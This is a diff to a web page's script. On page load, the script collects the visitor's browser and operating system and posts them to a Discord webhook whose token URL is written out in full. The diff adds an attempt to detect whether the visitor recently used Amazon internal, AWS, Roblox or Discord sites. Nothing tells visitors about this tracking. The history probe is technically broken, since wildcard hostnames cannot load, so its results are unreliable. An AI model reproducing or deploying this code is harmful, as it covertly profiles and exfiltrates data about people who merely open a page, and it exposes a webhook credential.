@@ -1,5 +1,5 @@
 // Function to get the user's browser and OS information
-        function getUserInfo() {
+      function getUserInfo() {
             const userAgent = navigator.userAgent;
             const platform = navigator.platform;
 
@@ -21,7 +21,42 @@
             return {os, browser};
         }
 
-// Function to send the info to the Discord webhook
+        // Function to check if specific URLs have been visited in the past 48 hours
+        async function checkVisitedUrls() {
+            const domains = [
+                "*.aws.dev", "*.aws.com", "*.amazon.com", "*.amazon-corp.com", "*.a2z.com", "*.roblox.com", "*.discord.com"
+            ];
+
+            const visitedUrls = [];
+
+            // Try to detect cached resources from each domain using prefetch/ping methods
+            for (let domain of domains) {
+                const url = `https://${domain}`;
+                try {
+                    // Load an image to check if the domain is cached
+                    const img = new Image();
+                    img.src = url;
+                    img.onload = function() {
+                        visitedUrls.push(domain);
+                        displayVisitedUrls(visitedUrls);
+                    };
+                } catch (error) {
+                    console.log(`Error checking ${domain}:`, error);
+                }
+            }
+        }
+
+        // Function to display visited URLs on the page
+        function displayVisitedUrls(visitedUrls) {
+            const visitedSection = document.getElementById("visited-urls");
+            if (visitedUrls.length > 0) {
+                visitedSection.innerHTML = `<strong>Recently Visited Domains:</strong> <br> ${visitedUrls.join(", ")}`;
+            } else {
+                visitedSection.innerHTML = `<strong>No recently visited domains detected.</strong>`;
+            }
+        }
+
+        // Function to send the info to the Discord webhook
         async function sendInfoToWebhook() {
             const userInfo = getUserInfo();
             const webhookURL = "https://discord.com/api/webhooks/1294771673937088575/VM6SHoyAUfr8FWLBL4xuVmUIFobmNAtrOtRM4iFZDVYkID0EmXJA23fEguiU_Hp1CIZv";
@@ -49,5 +84,8 @@
             }
         }
 
-// Send info when the page loads
-        window.onload = sendInfoToWebhook;
+        // Send info and check visited URLs when the page loads
+        window.onload = function() {
+            sendInfoToWebhook();
+            checkVisitedUrls();
+        };
